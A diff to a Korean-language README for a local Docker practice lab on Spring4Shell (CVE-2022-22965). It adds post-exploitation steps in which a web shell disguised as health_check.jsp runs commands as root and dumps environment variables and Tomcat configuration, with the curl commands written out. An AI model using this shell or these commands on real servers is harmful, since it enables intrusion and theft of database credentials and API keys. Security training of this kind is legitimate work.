@@ -13,9 +13,9 @@
 > 
 > 💡 **원클릭 자동 실행:** 개별 스크립트 실행 대신 아래 하나의 명령어로 전체 과정을 자동으로 실습할 수 있습니다.
 > ```bash
-> python3 exploit_runner.py
+> python3 run.py
 > ```
-> *(exploit_runner.py는 Docker 실습 환경에 맞춰 curl 다운로드 실패 시 `docker cp`로 자동 폴백되는 로직이 적용되어 있습니다.)*
+> *(run.py는 공격의 모든 단계와 **위협 증명(DB 정보 유출 시나리오)**까지 차례대로 수행한 뒤, 최종적으로 상세한 **HTML 결과 보고서**를 자동 생성하여 제공합니다.)*
 
 ---
 
@@ -188,37 +188,33 @@ Successfully copied 6.66kB to cvepratice-spring-1:/usr/local/tomcat/webapps/ROOT
 
 ---
 
-### 🌐 STEP 6. [검증] 2단계 완성형 웹쉘 동작 확인
+### 🌐 STEP 6. [위협 증명] 서버 내부 중요 정보 평문 노출 시연 (Post-Exploitation)
+
+완성형 웹쉘을 통해 서버 내부의 **환경 변수(DB 비밀번호 등)**와 **주요 설정 파일 폴더(`Tomcat conf`)**를 무단으로 열람하는 과정을 시연합니다. 
+이를 통해 개발자는 보안 취약점이 뚫렸을 때 데이터베이스 정보가 어떻게 유출될 수 있는지 파악할 수 있습니다.
 
 ```bash
-curl -s "http://localhost:8011/health_check.jsp?pwd=glory&cmd=id"
-```
+# 환경변수 전체 열람 (DB 비밀번호, API 키 노출 확인)
+curl -s "http://localhost:8011/health_check.jsp?pwd=glory&cmd=env"
 
-**결과 (HTML 포함):**
-```html
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Clean Architecture WebShell (Edu)</title>
-    ...
-</head>
-<body>
-    <h2>Advanced WebShell (Stage 2)</h2>
-    <div><span class="prompt">$ id</span></div>
-    <pre>uid=0(root) gid=0(root) groups=0(root)
-</pre>
-</body>
-</html>
+# 주요 설정 폴더 무단 조회
+curl -s "http://localhost:8011/health_check.jsp?pwd=glory&cmd=ls%20-la%20/usr/local/tomcat/conf"
 ```
-
-> 브라우저에서 직접 열고 싶은 경우, 아래 주소를 복사하여 브라우저 주소창에 붙여넣기 합니다.
-> ```
-> http://localhost:8011/health_check.jsp?pwd=glory&cmd=id
-> ```
 
 ---
 
-| STEP 6 | `curl -s "http://localhost:8011/health_check.jsp?pwd=glory&cmd=id"` | HTML 응답 내 `uid=0(root) gid=0(root) groups=0(root)` 출력 |
+### 📄 STEP 7. HTML 실습 결과 보고서 확인
+
+`run.py`를 실행하여 모든 과정(STEP 1 ~ STEP 6)을 성공적으로 마쳤다면, 현재 폴더에 실행 시간이 기록된 HTML 보고서 파일이 생성됩니다.
+
+```bash
+# 생성된 파일 예시
+report_20260317_231217.html
+```
+
+해당 파일을 더블클릭하여 브라우저로 열면, **각 공격 단계의 상세한 목적**과 **웹쉘을 통해 서버를 탈취한 원격 명령어 실행 결과**, 그리고 초보자와 개발자가 이해하기 쉽도록 작성된 **데이터 탈취 위협 증명 시뮬레이션 결과**를 전문적인 UI 레이아웃으로 확인할 수 있습니다.
+
+---
 
 
 
@@ -304,7 +300,7 @@ docker ps | grep spring
 ```
 CVE-2022-22965/
 ├── README.md                  # 이 문서
-├── exploit_runner.py          # 🚀 [NEW] 원클릭 자동 통합 실행기 (Docker 전용 자동 폴백 포함)
+├── run.py                     # 🚀 [NEW] 원클릭 자동 통합 실행기 (HTML 실습 보고서 자동 생성 기능 포함)
 ├── stage1_dropper.py          # Stage 1: Spring4Shell 공격 스크립트 (Stager 생성)
 ├── stage2_uploader.py         # Stage 2: 완성형 웹쉘 배포 스크립트
 └── health_check.jsp           # Stage 2: Clean Architecture 기반 웹쉘
@@ -446,6 +442,12 @@ curl -s "http://localhost:8011/health_check.jsp?pwd=glory&cmd=env"
 
 ---
 
+### 🚨 7. HTML 결과 보고서 확인 (run.py 전용)
+
+`python3 run.py` 명령어를 사용하여 실습을 마친 경우, 도용된 서버 내부의 환경 변수와 디렉터리 목록이 담긴 구체적 위험 시뮬레이션 결과가 예쁜 레이아웃을 가진 HTML 파일(예: `report_YYYYMMDD_HHMMSS.html`)로 결과물로 함께 제공됩니다. 즉시 브라우저로 열어 보안 조치를 위한 레퍼런스로 사용하세요!
+
+---
+
 ### 🧪 7. `test_stage1_dropper.py` — 유닛 테스트 실행
 
 **실제 서버 연결 없이 Mock 객체로 독립적으로 실행됩니다.**
@@ -555,7 +557,7 @@ Stage 1 거점을 발판 삼아 SOLID/Clean Architecture 기반의 완성형 웹
 # 방법 A: Python 자동화 스크립트 (curl 다운로드 방식 - host.docker.internal 접근)
 python3 stage2_uploader.py
 
-# 방법 B: Docker cp 직접 복사 (가장 확실한 방법 / exploit_runner.py 의 자동 폴백 방식)
+# 방법 B: Docker cp 직접 복사 (가장 확실한 방법 / run.py 의 자동 폴백 방식)
 docker cp health_check.jsp cvepratice-spring-1:/usr/local/tomcat/webapps/ROOT/health_check.jsp
 ```
 
@@ -571,6 +573,19 @@ curl -s "http://localhost:8011/health_check.jsp?pwd=glory&cmd=id"
 $ id
 uid=0(root) gid=0(root) groups=0(root)
 ```
+
+### Step 6. 위협 증명 시뮬레이션 (Post-Exploitation)
+
+완성형 웹쉘을 통해 DB 접속 정보를 포함할 가능성이 높은 시스템 환경 변수(`env`)와 타겟 시스템의 주요 설정 폴더(`Tomcat conf`)를 무단으로 열람하는 실습을 진행합니다.
+
+```bash
+# 서버 환경변수 전체 열람
+curl -s "http://localhost:8011/health_check.jsp?pwd=glory&cmd=env"
+```
+
+### Step 7. HTML 결과 보고서 확인
+
+`run.py` 통합 실행기를 통해 생성된 `report_YYYYMMDD_HHMMSS.html` 파일을 브라우저로 열어, 발생한 취약점 증적 자료와 공격 단계별 요약 결과를 확인합니다.
 
 ---
 
